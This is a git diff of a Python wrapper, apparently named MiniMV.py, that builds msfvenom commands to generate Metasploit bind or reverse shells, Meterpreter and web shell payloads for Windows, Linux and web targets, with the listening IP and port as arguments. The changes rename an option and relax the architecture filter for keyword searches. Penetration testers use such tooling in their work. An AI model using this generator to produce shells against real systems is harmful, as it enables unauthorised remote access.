@@ -21,7 +21,7 @@ import os
 def parse_options():
 
     parser = argparse.ArgumentParser(description='python MiniMV.py -t win -met -a x64 -stageless -ip 127.0.0.1 -p 1234 ')
-    parser.add_argument("-t", "--type", type=str, help="Type of Platform: Win, Lin , Web", dest='p_type')
+    parser.add_argument("-t", "--type", type=str, help="Shell type: Win, Lin , Web", dest='SHELL_TYPE')
     parser.add_argument("-m", "--met", help="Specify if Meterpreter shell", action ='store_true')
     parser.add_argument("-a", "--arch",  default="x86", type=str, help="Architecture (default x86) : x86, x64")
     parser.add_argument("-r", "--rev", help="Reverse Shell (default is BIND shell)", action='store_true')
@@ -30,8 +30,7 @@ def parse_options():
     parser.add_argument("-p", "--port", type=int, help="Port to connect to")
     parser.add_argument("-k", "--keyword", type=str, help="Search by special keyword (android, Hidden...)")
     parser.add_argument("--update", help="Update Payload list",action ='store_true')
-    parser.add_argument("-ls", "--list", action="store_true", help="List available shell types", dest='shell_list')
-    
+        
     args = parser.parse_args()
     if len(sys.argv) == 1:
         parser.print_help()
@@ -93,7 +92,7 @@ def generate_payload(params,number,avail_payloads,pname):
     elif K_TYPE== "linux":
         payload="msfvenom -p {} {}={} LPORT={} -f elf -o {}".format(payload_cmd,HOST, IP,PORT,pname+".elf")
     
-    elif args.p_type == "web":
+    elif args.SHELL_TYPE == "web":
          payload="msfvenom -p {} {}={} LPORT={} -f raw -o {}".format(payload_cmd,HOST, IP,PORT,pname + K_EXT)
          
     
@@ -157,13 +156,13 @@ if __name__ == "__main__":
     #'script' : ['py', 'ps1', 'pl' ]
      }
     
-    if not args.p_type:
+    if not args.SHELL_TYPE:
         # Special case when we are targeting other Os like android, unix, Mac via --keyword Arg
         K_TYPE =""
         K_EXT=""
     else:
         # Type of payload is given among Win, Lin, Web
-        key_type = switch_type.get(args.p_type.lower(),"There is an error in your shell OS type parameter")
+        key_type = switch_type.get(args.SHELL_TYPE.lower(),"There is an error in your shell OS type parameter")
         if isinstance (key_type, str):
             K_TYPE= key_type
             K_WEB=""
@@ -183,23 +182,24 @@ if __name__ == "__main__":
             elif K_EXT == ".asp":
                 K_TYPE = "windows"
         
-    	
+    K_KEY= args.keyword if args.keyword else ""	
     #Get Architecture 
-    # warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
-    if K_TYPE == "windows" and args.arch=="x86":
+    # Warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
+    # With other payloads like android, we should relax the default x86 arg othrwise we'll found nothing
+    if (K_TYPE == "windows" and args.arch=="x86") or (K_KEY):
         K_ARCH=""
     else:
         K_ARCH = args.arch.lower()
     K_MET = "meterpreter" if args.met else ""
     K_BIND = "reverse" if args.rev else "bind"
     K_STAGE = " " if args.stageless else "staged"
-    K_KEY= args.keyword if args.keyword else ""
+    
     
     params = [K_TYPE,K_ARCH,K_MET, K_BIND, K_STAGE,K_EXT, K_KEY]
     keywords_string= " ".join(params)     
     
     
-    if args.p_type =="web":
+    if args.SHELL_TYPE =="web":
         # WEB payloads don't have K_ARCH, K_STAGE, K_EXT mentionned
         # We should remove those keywords 
         keywords_string= keywords_string.replace(K_ARCH,'')
